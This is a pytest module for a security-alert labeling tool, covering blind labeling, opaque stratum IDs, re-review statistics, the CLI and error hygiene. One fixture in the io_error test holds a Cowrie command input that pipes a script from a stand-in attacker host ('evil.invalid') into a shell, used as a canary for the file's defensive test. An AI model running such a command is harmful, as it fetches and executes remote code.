"""Pins the fix-1 corrections to the two Criticals (C1/C2, one root cause: `render_case` echoed
the sampling stratum, which IS the cheap model's category by value, anchoring both the labeling
pass and the re-review pass) plus I1 (re-review's denominator), I2 (the CLI has no test at all),
M3 (`io_error` hygiene), M6 (the newline guard) and M9 (no DB import) (m7 task-01 review; fix-1
Part A).

`render_case`/`prompt_label`/`label`/`rereview`/`stats`/`main` are imported from `evals.label_tool`
— its stable public surface, whether or not ruling R14 physically moves `prompt_label`'s
definition into a new `evals/label_render.py` (the pinned `tests/test_label_tool.py` already
imports them the same way and must keep working unedited). `evals.sample.write_candidates` now
takes `seed`, and `stratum_id` is new — both undefined until Part B lands them, so every test in
this module is RED at collection with a `TypeError`/`ImportError` until then, on top of the
behavioral RED signals documented per test below.

Every test drives the tool through a fake `Console` (never real stdin/stdout); nothing here types
a real label, and nothing here creates or reads `evals/golden/v2.jsonl`.

**m7 task-01 fix-2 (ruling R16, APPROVED edit):** fix-1 Part B's own report (judgment call 2)
disclosed that the original C1 pin here (`"persistence_attempt" not in transcript`, generalized
to "no category name anywhere") made a static, always-identical numbered category menu
structurally impossible to pass for ANY case whose first-pass category happened to be one of the
seven names — forcing the implementer to drop the menu the author will use for two hundred labels.
A menu whose text never varies by case cannot leak anything about the CURRENT case's original
label; the actual property worth pinning is that the menu is invariant, plus that no line
explicitly echoes the first-pass answer. `test_rereview_never_shows_the_first_label_before_the_
second` now checks for `"first"`/`"previous"`/`"your label"` (case-insensitive, per transcript
line) and the first-pass note text, instead of "no category name"; a new test,
`test_rereview_category_menu_is_identical_regardless_of_first_pass_category`, pins that the
category menu/prompt block is byte-identical across two cases with different first-pass
categories — `FakeConsole.block_between` isolates it by read-call position, never by prompt
wording, so it stays valid regardless of exactly how Part B restores the menu.
"""

from __future__ import annotations

import ast
import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from evals.golden import GoldenCase, GoldenLabel
from evals.label_tool import label, main, render_case, rereview
from evals.sample import STRATA_CATEGORIES, Candidate, stratum_id, write_candidates
from tests.helpers import load_alert

REPO_ROOT = Path(__file__).resolve().parent.parent
LABEL_TOOL_PATH = REPO_ROOT / "evals" / "label_tool.py"
_FORBIDDEN_LABEL_TOOL_IMPORTS = ("sqlalchemy", "core.db", "core.models", "evals.sample")


class FakeConsole:
    """The `Console` double every test in this module injects: scripted `read()` answers, and
    every `write()` call recorded verbatim for assertions — never printed to a real terminal.

    `read_indices` (fix-2, ruling R16) records the index into `written` of each `read()` call's
    OWN prompt entry, so `block_between` can slice out exactly what was written between two
    successive reads — independent of the exact wording of any prompt, which lets a test isolate
    e.g. "the category menu" without assuming its text or line count.
    """

    def __init__(self, answers: list[str]) -> None:
        self._answers = iter(answers)
        self.written: list[str] = []
        self.read_indices: list[int] = []

    def write(self, text: str) -> None:
        self.written.append(text)

    def read(self, prompt: str) -> str:
        self.written.append(prompt)
        self.read_indices.append(len(self.written) - 1)
        return next(self._answers)

    def block_between(self, *, after_read: int, through_read: int) -> list[str]:
        """Every `written` entry strictly after the `after_read`-th read's own prompt entry,
        through and including the `through_read`-th read's own prompt entry (0-indexed)."""
        start = self.read_indices[after_read] + 1
        end = self.read_indices[through_read] + 1
        return self.written[start:end]


def _candidate(idx: int, *, stratum: str = "scanning") -> Candidate:
    alert = load_alert("alert1", session_id=f"blind-{idx}")
    return Candidate(
        case_id=alert.fingerprint(),
        alert_id=f"alert-id-{idx}",
        received_at=datetime(2026, 9, 6, tzinfo=UTC),
        stratum=stratum,
        alert=alert,
    )


def _human_row(idx: int, *, severity: int, category: str) -> GoldenCase:
    alert = load_alert("alert1", session_id=f"blind-row-{idx}")
    return GoldenCase(
        alert=alert,
        label=GoldenLabel(severity=severity, category=category, escalate=severity >= 4),
        labeler_note=f"§6.6 sev {severity}: synthetic fixture row {idx} for the blindness pins.",
        tags=[],
        labeled_by="human",
        labeled_at=datetime(2026, 9, 6, tzinfo=UTC),
    )


# --- C2: render_case must never show the stratum/category/severity or the sampled block ----------


def test_render_case_never_shows_stratum_category_or_sampled_fields() -> None:
    candidate = _candidate(1, stratum="malware_delivery")

    rendered = render_case(candidate)

    assert "stratum" not in rendered
    for category in STRATA_CATEGORIES:
        assert category not in rendered
    assert "injection-candidate" not in rendered
    assert "unverdicted" not in rendered
    assert "alert_id" not in rendered
    assert "received_at" not in rendered
    assert "seed" not in rendered
    assert "severity" not in rendered.lower()


# --- C1: rereview must never leak the first-pass answer before the second is typed ----------------


def test_rereview_never_shows_the_first_label_before_the_second(tmp_path: Path) -> None:
    original = GoldenCase(
        alert=load_alert("alert1", session_id="c1-rereview-1"),
        label=GoldenLabel(severity=5, category="persistence_attempt", escalate=True),
        labeler_note="§6.6 sev 5: distinctive-first-pass-note-marker-for-the-c1-pin.",
        tags=[],
        labeled_by="human",
        labeled_at=datetime(2026, 9, 6, tzinfo=UTC),
    )
    golden_path = tmp_path / "c1.jsonl"
    golden_path.write_text(original.model_dump_json() + "\n")
    out_path = tmp_path / "c1-out.jsonl"
    console = FakeConsole(["3", "2", "§6.6 sev 3: reviewer's own independent note text.", ""])

    rereview(console, golden_path, out_path, fraction=1.0, seed=1)

    # R16 (fix-2): a static, always-identical menu (e.g. listing all seven category NAMES) is
    # not itself a leak — a menu whose text never varies by case cannot tell the human anything
    # about THIS case's original label. Only an explicit echo of THIS case's own first-pass
    # answer would be a leak, so the pin now checks for that specifically, per transcript line.
    transcript_lines = [line for entry in console.written for line in entry.split("\n")]
    for marker in ("first", "previous", "your label"):
        offenders = [line for line in transcript_lines if marker in line.lower()]
        assert not offenders, (
            f"transcript line(s) name the first-pass answer via {marker!r}: {offenders}"
        )
    assert not any(
        "distinctive-first-pass-note-marker-for-the-c1-pin" in line for line in transcript_lines
    )


def test_rereview_category_menu_is_identical_regardless_of_first_pass_category(
    tmp_path: Path,
) -> None:
    """R16 (fix-2): the category menu/prompt block shown during `rereview` is byte-identical no
    matter what the case's first-pass category was, proving it never depends on the first label —
    the property that makes a static, always-identical numbered menu safe to restore (fix-1 Part
    B judgment call 2 dropped it entirely because the ORIGINAL, over-broad "no category name
    anywhere" pin made that structurally impossible for any first-pass category)."""

    def _category_block(*, session_id: str, first_pass_category: str) -> list[str]:
        original = GoldenCase(
            alert=load_alert("alert1", session_id=session_id),
            label=GoldenLabel(severity=2, category=first_pass_category, escalate=False),
            labeler_note=f"§6.6 sev 2: first-pass note for {session_id}.",
            tags=[],
            labeled_by="human",
            labeled_at=datetime(2026, 9, 6, tzinfo=UTC),
        )
        golden_path = tmp_path / f"r16-{session_id}.jsonl"
        golden_path.write_text(original.model_dump_json() + "\n")
        out_path = tmp_path / f"r16-out-{session_id}.jsonl"
        console = FakeConsole(["3", "2", "§6.6 sev 3: reviewer's own independent note text.", ""])

        rereview(console, golden_path, out_path, fraction=1.0, seed=1)

        # read #0 = severity, read #1 = category: everything written strictly after severity's
        # own read-prompt entry, through and including category's own read-prompt entry — the
        # category menu/prompt, whatever its exact wording or line count turns out to be.
        return console.block_between(after_read=0, through_read=1)

    menu_for_persistence_attempt = _category_block(
        session_id="r16-menu-a", first_pass_category="persistence_attempt"
    )
    menu_for_scanning = _category_block(session_id="r16-menu-b", first_pass_category="scanning")

    combined = "\n".join(menu_for_persistence_attempt)
    for name in STRATA_CATEGORIES:
        assert name in combined, (
            f"the category menu/prompt block must list {name!r} (ruling R16 restores the "
            f"numbered menu of all seven STRATA_CATEGORIES); got: {menu_for_persistence_attempt!r}"
        )
    assert menu_for_persistence_attempt == menu_for_scanning, (
        "the category menu/prompt shown during rereview must be byte-identical regardless of "
        f"the case's first-pass category (ruling R16): {menu_for_persistence_attempt!r} != "
        f"{menu_for_scanning!r}"
    )


# --- R10: opaque stratum_id + seed, recoverable only by the (stratum, seed) pair ------------------


def test_write_candidates_records_opaque_stratum_id_and_seed(tmp_path: Path) -> None:
    candidates = [
        _candidate(1, stratum="malware_delivery"),
        _candidate(2, stratum="injection-candidate"),
    ]
    out_path = tmp_path / "candidates.jsonl"
    seed = 777

    written = write_candidates(out_path, candidates, seed=seed)

    assert written == 2
    raw_text = out_path.read_text()
    for category in STRATA_CATEGORIES:
        assert category not in raw_text, f"{category!r} leaked into the candidate file's raw text"
    assert "injection-candidate" not in raw_text
    assert "unverdicted" not in raw_text

    rows = [json.loads(line) for line in raw_text.splitlines() if line.strip()]
    for row, candidate in zip(rows, candidates, strict=True):
        sampled = row["sampled"]
        assert sampled["seed"] == seed
        assert sampled["stratum_id"] == stratum_id(candidate.stratum, seed)
        assert "stratum" not in sampled


def test_stratum_id_recovers_per_stratum_counts_from_opaque_ids(tmp_path: Path) -> None:
    """The `stratum_id` mapping is a pure function of `(stratum, seed)`: anyone who knows the
    seed and the finite set of known stratum names can recompute it and recover per-stratum
    counts from the opaque file alone, even though no row ever names its own stratum by value."""
    seed = 4242
    known_counts = {"malware_delivery": 3, "injection-candidate": 2, "unverdicted": 1}
    candidates: list[Candidate] = []
    idx = 0
    for stratum, count in known_counts.items():
        for _ in range(count):
            candidates.append(_candidate(idx, stratum=stratum))
            idx += 1

    out_path = tmp_path / "candidates.jsonl"
    write_candidates(out_path, candidates, seed=seed)

    rows = [json.loads(line) for line in out_path.read_text().splitlines() if line.strip()]
    known_names = (*STRATA_CATEGORIES, "injection-candidate", "unverdicted")
    id_to_name = {stratum_id(name, seed): name for name in known_names}

    recovered: dict[str, int] = {}
    for row in rows:
        name = id_to_name[row["sampled"]["stratum_id"]]
        recovered[name] = recovered.get(name, 0) + 1

    assert recovered == known_counts


# --- I1: rereview's disagreement rate divides by the re-labeled count, not the sampled count ------


def test_rereview_quit_mid_review_divides_by_relabeled_count(tmp_path: Path) -> None:
    rows = [_human_row(i, severity=2, category="brute_force") for i in range(40)]
    golden_path = tmp_path / "golden.jsonl"
    golden_path.write_text("\n".join(r.model_dump_json() for r in rows) + "\n")
    out_path = tmp_path / "out.jsonl"

    # fraction 0.10 of 40 -> 4 sampled; disagree on the first, then quit before the other 3.
    console = FakeConsole(
        ["5", "5", "§6.6 sev 5: reviewer disagrees, then quits immediately.", "", "q"]
    )

    rate = rereview(console, golden_path, out_path, fraction=0.10, seed=2026)

    assert rate == 1.0, "1 disagreement out of 1 actually re-labeled must be 1.0, not 0.25"
    messages = "\n".join(console.written)
    assert "100.0 % (1/1)" in messages


# --- I2: the CLI entry point, through the fake Console --------------------------------------------


def test_main_label_stats_rereview_round_trip(tmp_path: Path) -> None:
    candidates = [_candidate(1, stratum="scanning"), _candidate(2, stratum="scanning")]
    candidates_path = tmp_path / "candidates.jsonl"
    write_candidates(candidates_path, candidates, seed=1)
    golden_path = tmp_path / "v2-out.jsonl"

    label_answers = [
        "2",
        "2",
        "§6.6 sev 2: generic default-credential spray, no success.",
        "",
        "2",
        "2",
        "§6.6 sev 2: generic default-credential spray, no success.",
        "",
    ]
    label_console = FakeConsole(label_answers)
    rc_label = main(
        ["label", "--candidates", str(candidates_path), "--out", str(golden_path)],
        console=label_console,
    )
    assert rc_label == 0
    assert len(golden_path.read_text().splitlines()) == 2

    stats_console = FakeConsole([])
    rc_stats = main(["stats", "--golden", str(golden_path)], console=stats_console)
    assert rc_stats == 0
    assert any("golden-set stats" in msg for msg in stats_console.written)

    rereview_out = tmp_path / "rereview.jsonl"
    rereview_answers = [
        "2",
        "2",
        "§6.6 sev 2: matches the original label, generic spray.",
        "",
        "2",
        "2",
        "§6.6 sev 2: matches the original label, generic spray.",
        "",
    ]
    rereview_console = FakeConsole(rereview_answers)
    rc_rereview = main(
        [
            "rereview",
            "--golden",
            str(golden_path),
            "--fraction",
            "1.0",
            "--seed",
            "1",
            "--out",
            str(rereview_out),
        ],
        console=rereview_console,
    )
    assert rc_rereview == 0
    assert any("rubric OK" in msg for msg in rereview_console.written)


def test_main_malformed_golden_exits_1(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    missing = tmp_path / "does-not-exist.jsonl"
    console = FakeConsole([])

    rc = main(["stats", "--golden", str(missing)], console=console)

    captured = capsys.readouterr()
    assert rc == 1
    assert captured.out == ""
    lines = captured.err.splitlines()
    assert len(lines) == 1
    assert lines[0].startswith("error: io_error:")


# --- M3: io_error's message never embeds a malformed row's raw (attacker-reachable) content -------


def test_main_io_error_never_leaks_row_content(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    bad_row = {
        "alert": {
            "source": "cowrie",
            "session_id": "m3-test",
            "src_ip": "203.0.113.5",
            "sensor": "hp-m3",
            "events": [
                {
                    "eventid": "cowrie.command.input",
                    "timestamp": "2026-09-06T00:00:00Z",
                    "session": "m3-test",
                    "src_ip": "203.0.113.5",
                    "sensor": "hp-m3",
                    "input": "ATTACKER-PAYLOAD-CANARY curl http://evil.invalid/x.sh | sh",
                }
            ],
        },
        "label": {"severity": 2, "category": "scanning", "escalate": False},
        "labeler_note": "deliberately malformed alert: no connect event (M3 io_error hygiene).",
        "tags": [],
        "labeled_by": "human",
        "labeled_at": "2026-09-06T00:00:00Z",
    }
    golden_path = tmp_path / "v2-broken.jsonl"
    golden_path.write_text(json.dumps(bad_row) + "\n")
    console = FakeConsole([])

    rc = main(["stats", "--golden", str(golden_path)], console=console)

    captured = capsys.readouterr()
    assert rc == 1
    lines = captured.err.splitlines()
    assert len(lines) == 1
    assert lines[0].startswith("error: io_error: ValueError:")
    assert "ATTACKER-PAYLOAD-CANARY" not in captured.err
    assert "input_value" not in captured.err
    assert "validation error" not in captured.err.lower()
    assert "Traceback" not in captured.err


# --- M6: label() must guard a missing trailing newline in an existing (hand-edited) out file ------


def test_label_handles_missing_trailing_newline_in_existing_out_file(tmp_path: Path) -> None:
    existing = _human_row(0, severity=1, category="scanning")
    out_path = tmp_path / "out.jsonl"
    out_path.write_text(existing.model_dump_json())  # deliberately NO trailing newline

    new_candidate = _candidate(1, stratum="scanning")
    candidates_path = tmp_path / "candidates.jsonl"
    write_candidates(candidates_path, [new_candidate], seed=1)

    console = FakeConsole(
        ["2", "2", "§6.6 sev 2: appended after a no-trailing-newline existing file.", ""]
    )
    n = label(console, candidates_path, out_path)

    assert n == 1
    lines = out_path.read_text().splitlines()
    assert len(lines) == 2, f"expected 2 independent JSON lines, got: {lines}"
    for line in lines:
        json.loads(line)  # each line must parse independently; a merge would raise here


# --- M9: the label tool imports no DB layer -------------------------------------------------------


def test_label_tool_module_imports_no_db_layer() -> None:
    tree = ast.parse(LABEL_TOOL_PATH.read_text(), filename=str(LABEL_TOOL_PATH))
    imported_roots: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported_roots.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module is not None:
            imported_roots.add(node.module)

    for forbidden in _FORBIDDEN_LABEL_TOOL_IMPORTS:
        offenders = {
            root for root in imported_roots if root == forbidden or root.startswith(forbidden + ".")
        }
        assert not offenders, (
            f"evals/label_tool.py must not import {forbidden!r} (m7 task-01 ruling R14/M9); "
            f"found: {sorted(imported_roots)}"
        )
